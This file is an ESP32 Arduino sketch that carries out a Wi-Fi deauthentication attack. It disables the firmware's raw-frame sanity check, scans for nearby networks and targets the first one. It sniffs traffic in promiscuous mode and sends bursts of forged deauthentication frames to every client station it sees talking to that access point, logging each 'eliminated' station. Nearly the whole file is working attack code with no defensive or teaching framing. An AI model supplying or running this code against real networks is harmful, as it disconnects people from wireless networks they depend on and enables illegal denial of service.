#include <WiFi.h>
#include <esp_wifi.h>


#define LED_PIN 2
// Deauthentication frame structure
typedef struct {
    uint8_t frame_control[2] = { 0xC0, 0x00 };
    uint8_t duration[2];
    uint8_t station[6];
    uint8_t sender[6];
    uint8_t access_point[6];
    uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
    uint16_t reason;
} deauth_frame_t;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t sequence_ctrl;
    uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
    mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_packet_t;

const wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Deauthentication frame
deauth_frame_t deauth_frame;
int eliminated_stations = 0;  // Track how many stations are eliminated

// Attack flag


extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Sniffer callback function to capture packets in promiscuous mode
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_packet_t *sniffed_packet = (wifi_packet_t *)pkt->payload;
    const mac_hdr_t *mac_header = &sniffed_packet->hdr;

    const uint16_t pkt_length = pkt->rx_ctrl.sig_len - sizeof(mac_hdr_t);

    if (pkt_length < 0) return;

    // Check if the frame is from the target access point
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
        memcpy(deauth_frame.station, mac_header->src, 6);
        for (int i = 0; i < 16; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
        }
        eliminated_stations++;
        Serial.printf("Sent %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", 16,
                       mac_header->src[0], mac_header->src[1], mac_header->src[2],
                       mac_header->src[3], mac_header->src[4], mac_header->src[5]);
        blink_led(2, 20);  // Blink LED as feedback
    }
}

// Blink LED function
void blink_led(int num_times, int blink_duration) {
    for (int i = 0; i < num_times; i++) {
        digitalWrite(LED_PIN, HIGH);  // Turn on the LED
        delay(blink_duration);        // Wait for the specified blink duration
        digitalWrite(LED_PIN, LOW);   // Turn off the LED
        delay(blink_duration);        // Wait again before the next blink
    }
}

// Start the deauth attack
void start_deauth(int wifi_number, uint16_t reason) {
    eliminated_stations = 0;
    deauth_frame.reason = reason;

    int numNetworks = WiFi.scanNetworks();
    if (wifi_number < 0 || wifi_number >= numNetworks) {
        Serial.println("Invalid WiFi network index");
        return;
    }

    Serial.print("Starting Deauth-Attack on network: ");
    Serial.println(WiFi.SSID(wifi_number));

    const uint8_t* bssid = WiFi.BSSID(wifi_number);
    if (bssid == nullptr) {
        Serial.println("Error: Failed to get BSSID");
        return;
    }

    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);

    // Set up the access point for the attack (SoftAP mode)
    WiFi.softAP("inws", "123456789", WiFi.channel(wifi_number));

    // Enable promiscuous mode and start sniffing
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
    Serial.println("Stopping Deauth-Attack...");
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    Serial.println("Deauth Attack Stopped.");
}

// Deauth attack logic
void deauth(int network,int controle) {
    if (controle == 0) {  // Start the attack if not already attacking
        start_deauth(network, 0);  // Attack the first network (change as needed)
        Serial.println("Deauth Attack Started");
    } else if (controle == 1) {  // Stop the attack if it is running
        stop_deauth();
        Serial.println("Deauth Attack Stopped");
    }
}

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    Serial.println("Deauth Attack Ready");
    pinMode(LED_PIN, OUTPUT);
    blink_led(3, 500);  // Blink the LED three times as an indication that setup is done
}

int x = 0;
void loop() {
    x++;
    for (int i = 0; i < 6; i++) {
        Serial.println(x);
        delay(1000);
    }
    if (x < 5) {
        deauth(0,0);
    }else if (x == 5){
        deauth(0,1);
    }

}

